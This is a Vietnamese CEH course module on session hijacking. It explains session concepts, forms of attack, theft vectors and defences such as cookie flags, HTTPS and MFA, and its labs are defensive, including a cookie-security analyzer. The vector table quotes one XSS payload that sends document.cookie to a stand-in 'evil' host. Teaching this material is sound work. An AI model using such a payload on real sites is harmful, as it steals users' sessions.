# Tuần 11: Session Hijacking (CEH v13 Module 11)

> Module CEH v13 tương ứng: **11 — Session Hijacking**. Nội dung đã được chuẩn hóa sang Markdown.

## Mục Tiêu Tuần / Week Objectives

Bám sát nội dung **Module 11** trong giáo trình CEH v13. Kết thúc tuần, học viên:

1. Hiểu **session** và **session ID** là gì, phân biệt **session spoofing** vs **session hijacking**.
2. Phân biệt **network-level hijacking** (blind hijacking, UDP hijacking, TCP/IP hijacking) và **application-level hijacking** (session fixation, session stealing qua XSS/sniffing, man-in-the-middle / man-in-the-browser).
3. Hiểu các vector đánh cắp session: **XSS** (Tuần 14), **sniffing** (Tuần 8), **session prediction**, **session fixation**, **CSRF**.
4. Nắm các biện pháp **phòng thủ**: HTTPS toàn trình, cookie flags (Secure/HttpOnly/SameSite), session timeout, xoay session sau login, MFA, IP pinning, IPSec.
5. Xây dựng kỹ năng **phân tích cookie** để kiểm tra độ an toàn của session cookie trên web app của chính mình (Lab 1).

---

## Lý Thuyết / Theory

### 1. Session, Session ID & Phân Biệt Khái Niệm

| Khái niệm | Giải thích |
|-----------|------------|
| **Session** | Trạng thái giao tiếp giữa client và server sau khi xác thực |
| **Session ID** | Token định danh session (thường là cookie, hoặc trong URL) |
| **Spoofing** | Mạo danh **bằng cách đoán/giả** session ID của người khác |
| **Hijacking** | Chiếm đoạt **session đang hoạt động** của nạn nhân |

> **Liên hệ Tuần 8:** sniffing HTTP plaintext lộ cookie session → kẻ tấn công replay cookie đó = session hijacking. Đây là lý do HTTPS phải là **mặc định**.

### 2. Các Dạng Session Hijacking

| Dạng | Cơ chế | Ví dụ |
|------|--------|-------|
| **Network-level (TCP/IP hijacking)** | Chèn packet vào kết nối TCP thật; **blind hijacking** (từ xa, dự đoán seq) | Attacker chèn gói tin vào phiên telnet |
| **UDP hijacking** | UDP không handshake → dễ chèn packet giả | Chèn request DNS/TFTP giả |
| **Application-level** | Đánh cắp/ép session ID ở tầng ứng dụng | XSS steal cookie, session fixation |
| **Session fixation** | Attacker **đưa** session ID cố định cho nạn nhân → sau đó dùng chính ID đó | Gửi link `?sessionid=ABC123` |
| **Session stealing** | Trộm session ID của nạn nhân (sniff, XSS, malware) | Cookie steal qua XSS |
| **Man-in-the-middle / Man-in-the-browser** | Đứng giữa / cắm vào trình duyệt để can thiệp | Proxy độc, trojan trình duyệt |

### 3. Session Prediction & Weak Session ID

- Session ID **đoán được** nếu: ngắn, tuần tự (ID=1001, 1002...), có chu kỳ, dùng timestamp/MAC có thể dự đoán.
- **Phòng thủ:** session ID phải **ngẫu nhiên, dài (≥128 bits)**, sinh bằng **CSPRNG** (Lab 1 kiểm tra độ ngẫu nhiên).

### 4. Các Vector Đánh Cắp Session

| Vector | Cách khai thác | Phòng thủ |
|--------|----------------|-----------|
| **XSS** | Chèn `<script>fetch('//evil?c='+document.cookie)</script>` | **HttpOnly** cookie, output encoding (Tuần 14) |
| **Sniffing** | Bắt cookie qua mạng plaintext | **Secure** cookie + HTTPS |
| **CSRF** | Ép trình duyệt nạn nhân gửi request | **SameSite**, CSRF token |
| **Session fixation** | Ép session ID biết trước | **Xoay session ID sau login** |
| **Malware/trojan** | Đọc cookie trong trình duyệt | EDR, trình duyệt sạch, least privilege |

### 5. Phòng Thủ Tổng Hợp (Countermeasures)

- **HTTPS toàn trình** + HSTS; cookie đặt cờ **Secure** (chỉ gửi qua HTTPS).
- Cookie **HttpOnly** (JS không đọc được → chống XSS steal) và **SameSite=Lax/Strict** (chống CSRF).
- **Session timeout** ngắn, **xoay session ID** sau đăng nhập & thay đổi quyền.
- **MFA** — kể cả bị lộ session, phiên mới vẫn bị chặn nếu thiếu yếu tố 2.
- **IP pinning** (ràng buộc session với IP) và **detect session use from new device**.
- **IPSec** cho mạng nội bộ nhạy cảm (chống network-level hijacking).
- Giám sát: phát hiện 2 phiên cùng session ID, đăng nhập bất thường (SIEM).

---

## Cảnh Báo An Toàn & Đạo Đức / Safety & Ethics

> [!WARNING]
> 1. Lab tuần này là **PHÒNG THỦ**: phân tích cookie của web app **chính bạn** (web app của mình, hoặc cookie demo) — **không** đánh cắp/giả mạo phiên của người khác.
> 2. Session hijacking thật (TCP hijacking, session fixation tấn công người dùng) là **bất hợp pháp**. Chỉ nghiên cứu lý thuyết.
> 3. Nếu muốn thử trong lab, chỉ dùng **DVWA/OWASP Juice Shop** chạy localhost trong máy ảo của bạn.
> 4. Vi phạm = **FAIL toàn bộ khoá học**.

---

## Thực Học Code / Hands-On (Defensive-first)

> Code đầy đủ trong `CODE/week11_cookie_analyzer.py`. Tool phân tích **chuỗi cookie** bạn tự nhập — không đọc cookie của ai khác, không kết nối mạng.

### Lab 1: Session Cookie Analyzer — Kiểm tra cookie an toàn (Python)

Công cụ phòng thủ: nhập một **Set-Cookie header** (hoặc cookie) và tool sẽ kiểm tra: có **Secure** không, có **HttpOnly** không, có **SameSite** không, và ước lượng **độ mạnh session token** (chiều dài + độ ngẫu nhiên qua entropy).

```bash
python3 CODE/week11_cookie_analyzer.py --demo

# Tự nhập cookie (của web app CHÍNH BẠN hoặc demo)
python3 CODE/week11_cookie_analyzer.py --cookie "sessionid=abc123; Secure; HttpOnly"
```

Kết quả mẫu:

```
[COOKIE] sessionid=abc123; Secure; HttpOnly
[Secure]   OK — cookie chỉ gửi qua HTTPS
[HttpOnly] OK — JS không đọc được (chống XSS steal)
[SameSite] KHÔNG có — dễ bị CSRF
[ENTROPY SESSION TOKEN] ~ 17 bits (YẾU) — nên ≥ 128 bits, sinh bằng CSPRNG
[KẾT LUẬN] Cần bổ sung SameSite + dùng token dài ngẫu nhiên.
```

> **Giải thích CEH:** token `abc123` entropy thấp → **session prediction**. Cookie đúng chuẩn phải là chuỗi dài ngẫu nhiên (VD 32-64 hex chars), có 3 cờ `Secure; HttpOnly; SameSite=Lax`.

### Lab 2: Thực hành kiểm tra web app của chính bạn (nếu có)

```bash
# Xem header Set-Cookie của web app mình đang dev (localhost)
curl -sI http://localhost:3000 | grep -i set-cookie
# Kiểm tra web app của bạn có HSTS không
curl -sI https://localhost:8080 | grep -i strict-transport
```

> Chỉ chạy với **localhost / app của bạn**. Không dùng curl để rà cookie của site người khác (đó là footprinting bất hợp pháp nếu không được phép).

### Lab 3: Cấu hình cookie an toàn (mã tham khảo phòng thủ)

```js
// Node.js/Express — cookie an toàn (tham khảo phòng thủ)
res.cookie("sessionid", token, {
  httpOnly: true,      // JS không đọc
  secure: true,        // chỉ qua HTTPS
  sameSite: "lax",     // chống CSRF
  maxAge: 30 * 60 * 1000,  // hết hạn sau 30 phút
  path: "/",
});
```

```python
# Django — settings (tham khảo phòng thủ)
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = "Lax"
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
```

---

## Bài Tập Về Nhà / Homework

1. **Phân tích cookie:** chạy `week11_cookie_analyzer.py --demo`, sau đó tự nhập 2 cookie (1 yếu kiểu `id=123`, 1 mạnh đủ flags), chụp màn hình, giải thích từng cờ.
2. **Nghiên cứu session fixation:** mô tả kịch bản session fixation hoàn chỉnh (attacker chuẩn bị ID, ép nạn nhân, nạn nhân login, attacker dùng ID) và giải thích vì sao **xoay session sau login** chặn được.
3. **Viết chính sách cookie:** liệt kê 5 cài đặt cookie/session cần áp dụng cho một web app (kèm lý do).
4. **Case study:** tìm hiểu 1 vụ session hijacking/credential stuffing thực tế (VD: token grabber qua malware) — tóm tắt 10 dòng.

---

## Rubric Đánh Giá Tuần 11

| Tiêu chí | Xuất sắc (90-100%) | Khá (70-89%) | Yếu (<70%) |
|----------|--------------------|--------------|------------|
| **Phân tích cookie** | Phân tích đúng 3 cookie + giải thích từng cờ (40đ) | Phân tích đúng nhưng thiếu giải thích (25đ) | Không chạy tool (10đ) |
| **Session fixation** | Mô tả đủ 4 bước + đúng giải pháp (30đ) | Đủ bước nhưng sai giải pháp (20đ) | Mô tả sai khái niệm (5đ) |
| **Chính sách + case** | Đủ 5 cài đặt + phân tích case (30đ) | Thiếu 1 phần (20đ) | Chép lại (5đ) |

---

## Checklist Đầu Ra Tuần 11

- [ ] Phân biệt session spoofing vs hijacking; network-level vs application-level
- [ ] Giải thích được session fixation và cách chống (xoay session sau login)
- [ ] Hiểu vì sao XSS + HttpOnly; sniffing + Secure; CSRF + SameSite
- [ ] Hiểu session prediction (token ngắn/tuần tự nguy hiểm, cần CSPRNG)
- [ ] Chạy thành công `week11_cookie_analyzer.py --demo`
- [ ] Nêu 5 countermeasures (HTTPS, Secure/HttpOnly/SameSite, timeout, xoay ID, MFA, IPSec)
